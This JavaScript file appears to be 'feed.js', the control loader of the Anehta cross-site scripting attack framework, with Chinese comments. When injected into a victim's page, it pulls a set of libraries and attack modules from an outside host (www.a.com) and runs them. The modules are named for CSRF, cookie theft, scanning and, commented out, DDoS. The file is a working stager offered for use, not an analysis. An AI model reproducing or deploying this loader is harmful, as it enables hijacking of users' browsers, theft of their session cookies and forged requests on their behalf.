var anehtaurl = "http://www.a.com/anehta";
//var anehtaurl="http://www.a.com/anehta";
// feed.js 是中心控制文件，在这里插入各种脚本模块
// Author: axis
//alert("feed.js 种子");
var anehtaFeedIsLoaded = false;

//已经加载过feed.js了
if (typeof anehtaLibs != "undefined"){
	anehtaFeedIsLoaded = true;
}

var anehtaLibs = [
  // Library
  {name: "AnehtaLib", url: "/library/anehta.js"},
  //{name: "DojoLib", url: "......"},
  {name: "JqueryLib", url: "/library/jquery.js"}
];

var anehtaModules = [
  // Modules
  {name: "ClxMod", url: "/module/clx.js"},
  {name: "XsrfMod", url: "/module/xsrf.js"},
  //{name: "DdosMod", url: "/module/ddos.js"},
  {name: "XCookieMod", url: "/module/xcookie.js"},
  {name: "ScannerMod", url: "/module/scanner.js"},
  {name: "CustomizeMod", url: "/module/customize.js"},
  {name: "HelpMod", url: "/module/help.js"},
  {name: "TestMod", url: "/module/test.js"}
];


function injectScript(ptr_sc){
    s=document.createElement("script");
    s.src=ptr_sc;
    try {
      document.getElementsByTagName("body")[0].appendChild(s);
    } catch (e) {
    	document.documentElement.appendChild(document.createElement("body"));
			document.getElementsByTagName("body")[0].appendChild(s);
    }
}

function addScript(ptr_sc){
    document.write("<script src='"+ptr_sc+"'></script>");
}

// 避免重复加载feed.js
if (anehtaFeedIsLoaded != true){

// 先加载library
for (i=0; i<anehtaLibs.length; i++){
	injectScript(anehtaurl + anehtaLibs[i].url);
	//addScript(anehtaurl + anehtaLibs[i].url);
}

//setTimeout(
  //function(){
    // 再加载 modules
    for (i=0; i<anehtaModules.length; i++){
	    injectScript(anehtaurl + anehtaModules[i].url);
	    //addScript(anehtaurl + anehtaModules[i].url);
    }
  //}, 
  //500);
}